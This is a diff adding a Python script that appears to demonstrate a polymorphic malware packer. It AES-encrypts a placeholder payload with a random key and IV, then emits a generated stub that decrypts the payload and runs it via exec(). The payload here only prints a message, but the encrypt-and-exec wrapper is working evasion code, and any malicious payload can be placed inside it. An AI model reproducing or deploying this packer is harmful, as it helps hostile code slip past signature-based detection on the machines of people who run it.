@@ -1,0 +1,78 @@
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+import os
+import base64
+
+def encrypt(data, key, iv):
+    # Pad data to be AES block size (128 bits) compatible
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(data) + padder.finalize()
+
+    # Encrypt the data
+    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+
+    return encrypted_data
+
+def decrypt(data, key, iv):
+    # Decrypt the data
+    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(data) + decryptor.finalize()
+
+    # Unpad data
+    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+    decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
+
+    return decrypted_data
+
+def generate_random_key_iv():
+    key = os.urandom(32)  # AES-256 key size
+    iv = os.urandom(16)   # AES block size
+    return key, iv
+
+def main():
+    payload = b"print('This is the malicious payload.')"
+
+    # Generate random key and IV for encryption
+    key, iv = generate_random_key_iv()
+
+    # Encrypt the payload
+    encrypted_payload = encrypt(payload, key, iv)
+
+    # Generate a random decryption routine
+    decryption_routine = f"""
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
+
+def decrypt(data, key, iv):
+    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(data) + decryptor.finalize()
+
+    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+    decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
+    
+    return decrypted_data
+
+# Encrypted payload
+encrypted_payload = {list(encrypted_payload)}
+
+# Decryption key and IV
+key = {list(key)}
+iv = {list(iv)}
+
+# Decrypt and execute the payload
+payload = decrypt(bytes(encrypted_payload), bytes(key), bytes(iv))
+exec(payload.decode('utf-8'))
+"""
+
+    # Simulate the polymorphic nature by printing different decryption routines
+    print("Generated Decryption Routine:")
+    print(decryption_routine)
+
+if __name__ == "__main__":
+    main()
